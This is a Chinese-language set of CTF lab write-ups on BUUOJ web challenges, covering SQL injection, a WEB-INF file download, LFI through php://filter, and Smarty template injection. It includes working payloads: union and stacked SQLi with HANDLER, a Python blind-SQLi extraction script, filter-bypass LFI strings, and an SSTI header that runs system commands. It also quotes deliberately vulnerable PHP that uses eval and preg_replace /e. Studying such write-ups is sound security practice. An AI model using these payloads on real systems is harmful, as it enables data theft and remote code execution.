#  [GXYCTF2019]BabySQli
sql注入，先随便输一个，返回密码错误，但是发现源码中有一段加密字符
![](assets/Day%205/file-20251223124539623.png)
base32+base64解密：
```sql
select * from user where username = '$name'
```
是sql语句，尝试了group by爆出列数,3列，但是union注入的时候，只会反回`wrong user
本来想尝试报错注入，但是小括号被过滤了。
想盲注，但是and这些也被过滤了。试了异或这些，还是不行。感觉应该不会是这么复杂吧，不太会就看了wp
这脑洞太大了

1. 首先也是判断列数
2. 然后注意到账号为admin时回显`wrong pass!`，而账号不是admin时回显`wrong user!`，加上告诉我们的sql语句中也不是查询同时满足账号密码的就登录，所以猜测查询逻辑是，先根据账号查询，返回数据中有密码，再比对输入的密码和查询到的密码。类似这样
```php

$name = $_POST['name'];
$password = $_POST['pw'];
$sql = "select * from user where username = '".$name."'";   
// echo $sql;
$result = mysqli_query($con, $sql);      
$arr = mysqli_fetch_row($result);
// print_r($arr);
if($arr[1] == "admin"){
	if(md5($password) == $arr[2]){
		echo $flag;
	}else{
			die("wrong pass!");
		}
}else{
		die("wrong user!");
	 }
}

   ```
3. 然后我们可以通过union注入去注出三个回显位哪个是`username`，发现是第二个![500](assets/Day%205/file-20251223132656505.png)
4. 然后在利用union查询的特性，我们可以伪造查询结果，就拿我自己的数据库举例![400](assets/Day%205/file-20251223133050855.png)
   这里就是我们伪造了最后一条记录上去了，同样这里题目我们也可以伪造一条admin账户的查询结果，混淆正确密码，但是这个md5加密一下我是真的想不到，不过也算是契合实际吧，算是经验了。
5. payload：
```http
?name=admi'union select 1,'admin','202cb962ac59075b964b07152d234b70'--+&pw=123

# 这里'202cb962ac59075b964b07152d234b70'是'123'的md5加密，
```
就是伪造了一个admin的密码，然后密码输入123就好了。
# [GYCTF2020]Blacklist
sql注入
过滤了；
```php
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```
   因为过滤了select所以要绕一下，绕过select的方法我知道的有三中，回顾一下：
   1. 预处理语句
就是用16进制字符串的形式把sql语句预处理之后再调用，就像这样
```http
?inject=-1';SeT@a=73656c656374202a2066726f6d20466c616748657265;prepare execsql from @a;execute execsql;#

# 这里'73656c656374202a2066726f6d20466c616748657265'是16进制的'select * from FlagHere'
```
但是这样就需要用到`prepare`，`execsql`，`execute`，`set`等关键字，这里还是被过滤了
2. 改表
这个适用页面可以直接查询其他表的时候，我们可以把我们需要的表改为页面查询的表，这样就可以直接查，但是这里并不适用
3. hadler语句代替select
这个方法也是一种查询方法，可以一行行查询
```sql
handler '表名' open;  /  handler '表名' open as '别名'; --打开
handler '表名' read first;  --读取第一行
handler '表名' read next;  --读取下一行（要先读取第一行）

--还可以：
handler '表名' read first/next limit 10；--显示下面10行或者从开始数的10行

handler '表名' close；  --释放空间
```

所以我们这里可以用hadler语法查询
首先我们通过堆叠注入查询一下表：
```http
?inject=1'show+tables;--+
```
![500](assets/Day%205/file-20251223140522438.png)
这里就确定了表名，接下来就用hadler直接查询:
```http
?inject=1';handler+FlagHere+open+as+a;handler+a+read+first--+
```
![500](assets/Day%205/file-20251223140422361.png)
# [RoarCTF 2019]Easy Java
进去是登录框，查看源码发现一个路由，疑似文件读取
`Download?filename=help.docx`
![](assets/Day%205/file-20251223141554696.png)
每台接触过java题，所以不知道该怎么做，所以看wp了。[WEB-INF文件夹利用](../安全学习/Java安全/WEB-INF文件夹利用.md)
（这里说要改为post传参才能下载文件，不知道为什么？）
我们先看一下`web.xml`
![700](assets/Day%205/file-20251223143401975.png)
找到疑似和flag有关的文件`FlagController`
然后就去看一下对应的class文件
发现一段base64加密，![](assets/Day%205/file-20251223143714532.png)
解码得到flag（也可以去反编译一下）
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(
    name = "FlagController"
)
public class FlagController extends HttpServlet {
    String flag = "ZmxhZ3tjY2Y4MjY5Yi02YThkLTQzYTQtOWNlMi1hY2E1NTIxY2UxMzl9Cg==";

    protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
        PrintWriter var3 = var2.getWriter();
        var3.print("<h1>Flag is nearby ~ Come on! ! !</h1>");
    }
}

```

# [CISCN2019 华北赛区 Day2 Web1]Hack World
简单fuzz一下，发现and，空格，or这些好像都过滤了，但是盲注的一些函数没有，像ascii，substr这些都在
所以我们可以打布尔盲注，并且告诉了我们flag所在的表和列
这里and or过滤了我们就用异或`^`，这个是一真一假就为真。所以我们前面的要为假，我们设为0
```http
id = 0^((substr((select(flag)from(flag)),1,1))='f')
```
已经可以看出差别了，那就上脚本，这里不知道是我脚本有问题还是环境有问题，总是跑到一半就开始乱码或者停止，可能是一些网络问题，怎么改脚本也没用，我这里选择分批获取flag，先跑一半，再跑一半
![500](assets/Day%205/file-20251223183806855.png)
![700](assets/Day%205/file-20251223183857937.png)
exp：
```python
import requests
import time

url = "http://76b13ca1-49ab-4c96-ad9f-4cfaf7f2d88c.node5.buuoj.cn:81/"
session = requests.Session()


def check(payload):
    # 【核心改动1】增加重试机制
    # 只要有一次成功返回 Hello 就算 True，只有试了 5 次都没 Hello 才算 False
    for _ in range(5):
        try:
            r = session.post(url, data={"id": payload}, timeout=7)  # 增加超时时间
            if "Hello" in r.text:
                return True
            # 如果请求成功但没有 Hello，说明表达式确实为假
            return False
        except:
            # 如果是网络报错（超时、连接断开），等 0.5 秒重试
            time.sleep(0.5)
            continue
    return False


flag = ""
print("[+] Start searching flag...")

for pos in range(29, 64):
    low = 32
    high = 127

    # 【核心改动2】探测当前位置是否有字符，确认 3 次防止误判
    is_char_exists = False
    for _ in range(3):
        if check(f"0^(ascii(substr((select(flag)from(flag)),{pos},1))>0)"):
            is_char_exists = True
            break

    if not is_char_exists:
        print("\n[*] Flag extraction complete.")
        break

    # 二分法部分
    while low < high:
        mid = (low + high) // 2
        payload = f"0^(ascii(substr((select(flag)from(flag)),{pos},1))>{mid})"

        if check(payload):
            low = mid + 1
        else:
            high = mid

    # 【核心改动3】容错处理
    # 如果 low 还在 32，说明没跑出来，可能真的结束了或出了大错
    if low == 32:
        break

    flag += chr(low)
    # 增加实时打印，防止看不到进度
    print(f"\r[+] Found: {flag}", end="", flush=True)

print(f"\n\n[SUCCESS] Final Flag: {flag}")
```


首先抓两个按钮的包，发现就是一个参数`category`
![](assets/Day%205/file-20251223194640509.png)
我们尝试更改看看是不是sql注入之类的：
![](assets/Day%205/file-20251223194819145.png)
从报错信息很容易得到，会`include`包含我们的参数，并且最后会自动加上`.php`后缀。所以我们尝试用`php伪协议`读取源码，
```http
?category=php://filter/read=convert.base64-encode/resource=index
```

base64解码后得到源代码：
```php

<?php
	$file = $_GET['category'];
	if(isset($file)){
		
		if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
		include ($file . '.php');
	}else{
			echo "Sorry, we currently only support woofers and meowers.";
		}
	}
?>
```
读到源码，会传入文件名，
`strpos()`：查找字符串首次出现的位置
所以参数中起码要出现这三个字符串，并且注意到：
对于`index`的条件是格外不一样的，其他都是`!=false`而它是直接判断bool
也就是说 `woofers和meowers`首次出现的位置可以是开头，而`index`不能开头

然后就清楚了，payload：
```http
?category=php://filter/read=convert.base64-encode/index/resource=flag
```
这里必须出现其中之一，所以我们随便挑一个放到过滤器的位置，php会认为他是过滤器，但是他不是，这只是会爆警告，会继续执行程序，所以我们就注入了脏数据。

开始我还想着
```http
?category=php://filter/read=convert.base64-encode/resource=index.php/../flag
```
但是这样是不行的，目录穿越只能对目录，这里index.php是文件自然就不行。（这里flag.php文件就纯经验了）

# [BJDCTF2020]The mystery of ip
进去是一个博客，存在`flag.php`页面会显示ip
`hint.php`页面提示为什么会知道IP
猜测`xff`头注入，测试sql,但是输入什么都原样返回，考虑ssti了
![500](assets/Day%205/file-20251223213912252.png)
实锤ssti，这里php的ssti没学过，去学习一下。
我们通过`{$smarty.version}`判断是否是smarty模板
![500](assets/Day%205/file-20251223214310946.png)
确定是smarty了，老版本smarty模板允许直接在if标签中执行php代码
我们这里可以直接执行系统命令
![](assets/Day%205/file-20251223214603177.png)
payload:
```http
X-Forwarded-For: {if system('cat /flag')}{/if}
```
# [CISCN2019 华东南赛区]Web11
既然学到了smarty模板注入，那就趁热打铁在练一下吧
同样是php网站，可以获取我的ip，而且还一个很明显的`Build With Smarty !`
![](assets/Day%205/file-20251223220533553.png)
可以很确定也是smarty的模板注入
在测试一下xff头，果然根据xff判断ip，并且可以解析smarty语法
![](assets/Day%205/file-20251223220755819.png)
我们开始利用，直接尝试命令执行吧
![](assets/Day%205/file-20251223221010982.png)
可以看到也是可以直接利用的。

# [BJDCTF2020]ZJCTF，不过如此
白盒：
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
data协议传入指定字符串`I have a dream`，并且php伪协议读取`next.php`：
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
是`preg_replace`的`/e修正模式`的rce，这个我一直听过说过，但是没有真正遇到过，也是来学习一下：
https://xz.aliyun.com/news/2239
https://cloud.tencent.com/developer/article/1610410
学习后发现，这里就是要